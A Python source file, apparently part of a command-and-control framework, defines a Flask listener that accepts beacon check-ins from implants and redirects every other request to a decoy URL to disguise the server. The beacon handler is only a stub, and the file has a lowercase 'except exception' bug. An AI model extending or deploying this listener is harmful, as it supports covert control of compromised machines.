import logging
import json
import pymysql
from core.config import *
from core.message import Message
from gevent.wsgi import WSGIServer
from flask import Flask, request, redirect
from logging.handlers import RotatingFileHandler

# creates Flask app
app = Flask(__name__)
app.debug = True


@app.errorhandler(404)
def page_not_found_redirect(error):
    """
    DESCRIPTION:
        This function redirects all 404 requests to "redirect_url"
    """
    return redirect(app.config["redirect_url"])


@app.route("/<path:path>")
def catch_all_redirect(path):
    """
    DESCRIPTION:
        This function redirects all other requests to "redirect_url"
    """
    return redirect(app.config["redirect_url"])


class WebServer(object):

    def __init__(self):
        # tries to open the database connection
        try:
            self.connection = pymysql.connect(host="localhost",
                                              port=3306,
                                              user=username,
                                              passwd=password,
                                              db=database,
                                              autocommit=True)

        # exception raised during database connection
        except Exception:
            raise

    def beacon_response(self):
        """
        DESCRIPTION:
            This function is called when an implant beacons
        """
        # if request method is "GET"
        # the implant will never use this method
        # redirects client to the "redirect_url" specified in the profile
        if request.method == "GET":
            return redirect(app.config["redirect_url"])

        # else valid method
        else:
            return "beacon response"

    def start_flask(self, protocol, port, profile):
        """
        DESCRIPTION:
            This function starts the Flask web server
        """
        # tries to start the Flask web server
        try:
            # reads profile as a file
            with open(profile) as file:
                j = json.load(file)

            # creates Flask global variable for "redirect_url" due to scoping issues with self
            app.config["redirect_url"] = j["implant"]["redirect_url"]

            # adds beacon route
            app.add_url_rule(j["implant"]["beacon_uri"], None, self.beacon_response, methods=["GET", "POST"])

            # TO DO: add in update route here

            # configures Flask logging with 100 meg max file size
            # all requests are logged to "listener/logs/access.log"
            log_handler = RotatingFileHandler("logs/access.log", maxBytes=100000000, backupCount=3)
            app.logger.addHandler(log_handler)
            app.logger.setLevel(logging.INFO)

            # TO DO: INSERT entry into "listeners" table

            # starts Flask web server
            server = WSGIServer(("0.0.0.0", port), app, log=app.logger)
            Message().display_status("[+] Started listener on tcp/" + str(port))
            server.serve_forever()

        # ignores KeyboardInterrupt exception
        except KeyboardInterrupt:
            pass

        # exception raised starting the Flask web server
        except exception:
            raise

        # deletes all entries from "listeners" table
        # also closes the database connection
        finally:
            with self.connection.cursor() as cursor:
                cursor.execute("DELETE FROM listeners")

            if self.connection.open:
                self.connection.close()
